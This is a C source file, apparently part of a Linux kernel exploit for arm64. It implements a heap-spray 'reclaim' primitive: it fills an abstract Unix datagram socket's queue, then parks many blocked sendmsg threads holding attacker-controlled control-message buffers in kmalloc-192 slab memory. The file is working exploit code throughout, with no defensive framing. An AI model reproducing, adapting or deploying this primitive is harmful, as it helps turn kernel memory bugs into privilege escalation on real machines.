#define _GNU_SOURCE

#include "t870_cmsg_wave.h"

#include <errno.h>
#include <fcntl.h>
#include <stddef.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

static void *cmsg_wave_thread(void *opaque)
{
    static const unsigned char byte = 'C';
    struct t870_cmsg_job *job = opaque;
    struct iovec iov = {
        .iov_base = (void *)&byte,
        .iov_len = sizeof(byte),
    };
    struct msghdr message = {
        .msg_name = &job->receiver_address,
        .msg_namelen = job->receiver_address_length,
        .msg_iov = &iov,
        .msg_iovlen = 1,
        .msg_control = job->control,
        .msg_controllen = sizeof(job->control),
    };

    __sync_synchronize();
    job->entered = 1;
    errno = 0;
    job->result = sendmsg(job->sender_fd, &message, 0);
    job->send_errno = errno;
    __sync_synchronize();
    job->done = 1;
    return NULL;
}

void t870_cmsg_wave_release(struct t870_cmsg_wave *wave)
{
    unsigned char buffer[256];
    unsigned int attempt;
    unsigned int i;

    if (wave->started != 0U && wave->receiver_fd >= 0) {
        for (attempt = 0; attempt < 1000U; ++attempt) {
            unsigned int done = 0;

            while (recv(wave->receiver_fd, buffer, sizeof(buffer),
                        MSG_DONTWAIT) > 0) {
            }
            for (i = 0; i < wave->started; ++i) {
                __sync_synchronize();
                if (wave->jobs[i].done)
                    ++done;
            }
            if (done == wave->started)
                break;
            usleep(5000);
        }
    }
    for (i = 0; i < wave->started; ++i)
        pthread_join(wave->jobs[i].thread, NULL);
    wave->started = 0;
    for (i = 0; i < T870_CMSG_WAVE_SENDERS; ++i) {
        if (wave->jobs[i].sender_fd >= 0) {
            close(wave->jobs[i].sender_fd);
            wave->jobs[i].sender_fd = -1;
        }
    }
    for (i = 0; i < T870_CMSG_WAVE_FILLERS; ++i) {
        if (wave->filler_fds[i] >= 0) {
            close(wave->filler_fds[i]);
            wave->filler_fds[i] = -1;
        }
    }
    if (wave->receiver_fd >= 0) {
        close(wave->receiver_fd);
        wave->receiver_fd = -1;
    }
}

int t870_cmsg_wave_prepare(
    struct t870_cmsg_wave *wave,
    const unsigned char control_template[T870_CMSG_CONTROL_SIZE],
    const char *wave_label)
{
    static const unsigned char fill_byte = 'F';
    unsigned int fill_count = 0;
    unsigned int i;

    _Static_assert(sizeof(struct cmsghdr) == 16U,
                   "unexpected arm64 cmsghdr size");
    if (wave == NULL || control_template == NULL || wave_label == NULL ||
        wave_label[0] == '\0') {
        errno = EINVAL;
        return -1;
    }
    wave->receiver_fd = -1;
    for (i = 0; i < T870_CMSG_WAVE_FILLERS; ++i)
        wave->filler_fds[i] = -1;
    for (i = 0; i < T870_CMSG_WAVE_SENDERS; ++i)
        wave->jobs[i].sender_fd = -1;
    wave->started = 0;
    memset(&wave->receiver_address, 0, sizeof(wave->receiver_address));
    wave->receiver_address.sun_family = AF_UNIX;
    if (snprintf(wave->receiver_address.sun_path + 1,
                 sizeof(wave->receiver_address.sun_path) - 1,
                 "t870-cmsg-%d-%s", getpid(), wave_label) >=
        (int)(sizeof(wave->receiver_address.sun_path) - 1)) {
        errno = ENAMETOOLONG;
        goto fail;
    }
    wave->receiver_address_length =
        (socklen_t)(offsetof(struct sockaddr_un, sun_path) + 1U +
        strlen(wave->receiver_address.sun_path + 1));

    wave->receiver_fd = socket(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC, 0);
    if (wave->receiver_fd < 0) {
        fprintf(stderr, "[-] cmsg receiver socket: %s\n", strerror(errno));
        goto fail;
    }
    if (bind(wave->receiver_fd,
             (struct sockaddr *)&wave->receiver_address,
             wave->receiver_address_length) != 0) {
        fprintf(stderr, "[-] cmsg receiver bind: %s\n", strerror(errno));
        goto fail;
    }
    for (i = 0; i < T870_CMSG_WAVE_FILLERS; ++i) {
        int flags;

        wave->filler_fds[i] =
            socket(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC, 0);
        if (wave->filler_fds[i] < 0) {
            fprintf(stderr, "[-] cmsg filler socket %u: %s\n", i,
                    strerror(errno));
            goto fail;
        }
        flags = fcntl(wave->filler_fds[i], F_GETFL, 0);
        if (flags < 0 || fcntl(wave->filler_fds[i], F_SETFL,
                               flags | O_NONBLOCK) != 0) {
            fprintf(stderr, "[-] cmsg filler %u nonblock: %s\n", i,
                    strerror(errno));
            goto fail;
        }
        while (fill_count < 4096U) {
            ssize_t sent = sendto(
                wave->filler_fds[i], &fill_byte, sizeof(fill_byte), 0,
                (struct sockaddr *)&wave->receiver_address,
                wave->receiver_address_length);

            if (sent == (ssize_t)sizeof(fill_byte)) {
                ++fill_count;
                continue;
            }
            if (sent < 0 && (errno == EAGAIN || errno == EWOULDBLOCK))
                break;
            fprintf(stderr, "[-] cmsg receiver fill %u: %s\n", i,
                    strerror(errno));
            goto fail;
        }
    }
    if (fill_count == 0U || fill_count == 4096U) {
        fprintf(stderr, "[-] cmsg receiver did not reach a bounded full "
                "queue count=%u\n", fill_count);
        goto fail;
    }

    for (i = 0; i < T870_CMSG_WAVE_SENDERS; ++i) {
        struct t870_cmsg_job *job = &wave->jobs[i];

        memset(job, 0, sizeof(*job));
        job->sender_fd = socket(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC, 0);
        if (job->sender_fd < 0) {
            fprintf(stderr, "[-] cmsg sender %u: %s\n", i,
                    strerror(errno));
            goto fail;
        }
        job->receiver_address = wave->receiver_address;
        job->receiver_address_length = wave->receiver_address_length;
        memcpy(job->control, control_template, sizeof(job->control));
    }
    printf("[+] cmsg reclaim prepared wave=%s jobs=%u control=%u "
           "kmalloc-192 receiver_fill=%u\n", wave_label,
           T870_CMSG_WAVE_SENDERS, T870_CMSG_CONTROL_SIZE, fill_count);
    printf("[+] cmsg fillers=%u; blocked sender count is the runtime "
           "queue-full gate\n", T870_CMSG_WAVE_FILLERS);
    return 0;

fail:
    t870_cmsg_wave_release(wave);
    return -1;
}

unsigned int t870_cmsg_wave_start(struct t870_cmsg_wave *wave)
{
    unsigned int attempt;
    unsigned int entered = 0;
    unsigned int i;

    for (i = 0; i < T870_CMSG_WAVE_SENDERS; ++i) {
        if (pthread_create(&wave->jobs[i].thread, NULL,
                           cmsg_wave_thread, &wave->jobs[i]) != 0) {
            fprintf(stderr, "[-] cmsg sender thread %u creation failed\n", i);
            break;
        }
        wave->started = i + 1U;
    }
    if (wave->started != T870_CMSG_WAVE_SENDERS)
        return 0;

    for (attempt = 0; attempt < 500U; ++attempt) {
        entered = 0;
        for (i = 0; i < wave->started; ++i) {
            __sync_synchronize();
            if (wave->jobs[i].entered && !wave->jobs[i].done)
                ++entered;
        }
        if (entered == wave->started)
            break;
        usleep(10000);
    }
    if (entered == wave->started)
        usleep(250000);
    for (i = 0; i < wave->started; ++i) {
        __sync_synchronize();
        if (wave->jobs[i].done) {
            fprintf(stderr, "[-] cmsg sender %u returned early ret=%d "
                    "errno=%d (%s)\n", i, wave->jobs[i].result,
                    wave->jobs[i].send_errno,
                    strerror(wave->jobs[i].send_errno));
            return 0;
        }
    }
    return entered;
}
